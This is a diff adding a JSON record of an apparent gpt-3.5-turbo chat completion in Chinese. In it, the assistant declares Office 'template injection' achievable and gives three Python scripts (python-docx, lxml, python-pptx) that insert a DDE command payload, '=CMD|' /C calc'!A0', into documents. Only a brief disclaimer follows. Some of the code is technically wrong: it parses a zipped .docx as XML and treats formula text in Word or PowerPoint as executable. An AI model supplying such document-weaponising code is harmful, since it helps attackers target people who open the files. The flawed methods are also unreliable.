@@ -1,0 +1,21 @@
+{
+  "id":"chatcmpl-8MdP26HAQiwSwDSy4KHqCArjCAKNT",
+  "object":"chat.completion",
+  "created":1700405372,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[可實現]\n\n方法一：\n使用python-docx套件來讀取和修改.docx檔案，並在模板中插入惡意程式碼。\n\n1. 安裝python-docx套件：\n   ```\n   pip install python-docx\n   ```\n\n2. 使用下列程式碼來實現Template Injection：\n   ```python\n   from docx import Document\n\n   def template_injection(file_path, malicious_code):\n       doc = Document(file_path)\n       for paragraph in doc.paragraphs:\n           runnable_text = paragraph.text\n           if runnable_text.startswith('{{') and runnable_text.endswith('}}'):\n               paragraph.text = f'{runnable_text}{malicious_code}'\n       doc.save('output.docx')\n\n   # 呼叫程式碼並指定要插入的惡意程式碼\n   template_injection('template.docx', '=CMD|\\' /C calc\\'!A0')\n   ```\n\n方法二：\n使用lxml套件來解析和修改XML檔案，以修改Office Open XML (.docx, .xlsx, .pptx)模板中的內容。\n\n1. 安裝lxml套件：\n   ```\n   pip install lxml\n   ```\n\n2. 使用下列程式碼來實現Template Injection：\n   ```python\n   from lxml import etree\n\n   def template_injection(file_path, malicious_code):\n       tree = etree.parse(file_path)\n\n       # 修改所有標籤內的文字\n       for element in tree.iter():\n           if element.text and element.text.startswith('{{') and element.text.endswith('}}'):\n               element.text = f'{element.text}{malicious_code}'\n\n       # 儲存修改後的檔案\n       tree.write('output.docx', encoding='UTF-8', pretty_print=True)\n\n   # 呼叫程式碼並指定要插入的惡意程式碼\n   template_injection('template.docx', '=CMD|\\' /C calc\\'!A0')\n   ```\n\n方法三：\n使用python-pptx套件來讀取和修改.pptx檔案，並在投影片中插入惡意程式碼。\n\n1. 安裝python-pptx套件：\n   ```\n   pip install python-pptx\n   ```\n\n2. 使用下列程式碼來實現Template Injection：\n   ```python\n   from pptx import Presentation\n\n   def template_injection(file_path, slide_index, malicious_code):\n       prs = Presentation(file_path)\n       slide = prs.slides[slide_index]\n\n       for shape in slide.shapes:\n           if shape.has_text_frame:\n               text_frame = shape.text_frame\n               for paragraph in text_frame.paragraphs:\n                   runnable_text = paragraph.text\n                   if runnable_text.startswith('{{') and runnable_text.endswith('}}'):\n                       paragraph.text = f'{runnable_text}{malicious_code}'\n\n       prs.save('output.pptx')\n\n   # 呼叫程式碼並指定要插入的惡意程式碼和要修改的投影片索引\n   template_injection('template.pptx', 0, '=CMD|\\' /C calc\\'!A0')\n   ```\n\n備註：\n以上程式碼僅示範如何在模板中插入惡意程式碼，實際使用時請注意法律與道德規範，並確保得到相關授權和使用權限。"
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":634,
+    "completion_tokens":825,
+    "total_tokens":1459
+  }
+}
